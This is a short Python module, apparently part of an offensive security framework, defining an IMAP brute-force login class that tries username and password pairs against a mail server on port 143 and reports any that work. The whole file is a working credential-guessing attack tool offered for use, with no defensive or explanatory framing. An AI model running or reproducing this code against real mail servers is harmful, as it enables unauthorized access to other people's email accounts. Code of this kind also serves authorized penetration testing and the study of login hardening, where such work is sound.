import imaplib

from bruteforce_login import ThreadedBruteForceLogin


class IMAPBruteForce(ThreadedBruteForceLogin):

    def __init__(self):
        super().__init__("imap_bruteforce",
                         ["imap", "email", "bruteforce"],
                         "brute force imap logins",
                         port=143)

    def login(self, username: str, password: str):
        try:
            with imaplib.IMAP4(self.rhost, self.rport, self.timeout) as server:
                server.login(username, password)

                print(f"[+] password found: {username}:{password}")
                return True
        except:
            pass

        if self.verbose:
            print(f"[-] incorrect credentials: {username}:{password}")

        return False
